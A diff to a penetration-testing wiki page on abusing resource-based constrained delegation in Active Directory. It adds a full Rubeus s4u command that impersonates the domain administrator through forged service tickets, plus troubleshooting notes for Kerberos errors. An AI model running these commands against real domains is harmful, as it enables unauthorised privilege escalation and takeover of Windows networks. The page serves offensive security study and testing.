@@ -76,12 +76,16 @@ Now, the attack can be performed:
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
 
+{% hint style="danger" %}
+Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
+{% endhint %}
+
 ![](../../.gitbook/assets/b3.png)
 
 You can generate more tickets just asking once using the `/altservice` param of Rubeus:
 
 ```bash
-> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:cifs,time,host,http,winrm,rpcss,ldap /domain:domain.local /ptt
+rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:cifs,time,host,http,winrm,rpcss,ldap /domain:domain.local /ptt
 ```
 
 ### Accessing
@@ -100,6 +104,10 @@ ls \\victim.domain.local\C$
 * **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash \(or just supply it the rc4, aes128 and aes256 hashes\). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
 * **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
 * **`preauth_failed`**: This means that the given  username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes \(`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`\)
+* **`KDC_ERR_BADOPTION`**: This may mean:
+  * The user you are trying to impersonate cannot access the desired service \(because you cannot impersonate it or because it doesn't have enough privileges\)
+  * The asked service doesn't exist \(if you ask for a ticket for winrm but winrm isn't running\)
+  * The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
 
 ## References
 
